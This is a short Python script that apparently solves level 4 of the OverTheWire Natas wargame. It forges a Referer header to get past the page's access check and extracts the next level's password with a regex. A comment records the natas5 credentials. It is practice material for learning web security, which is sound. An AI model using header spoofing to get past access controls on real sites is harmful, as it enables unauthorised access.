from bs4 import BeautifulSoup
import requests
import re

lvl = '4'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_headers = {'Referer': f'http://natas{next_level}.natas.labs.overthewire.org/'}
soup = BeautifulSoup(requests.get(url=url,auth=lvl_pass, headers=my_headers).text, 'html.parser')

pw=re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)



'''
Lesson about HTTP request headers.

Username: natas5
Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

'''
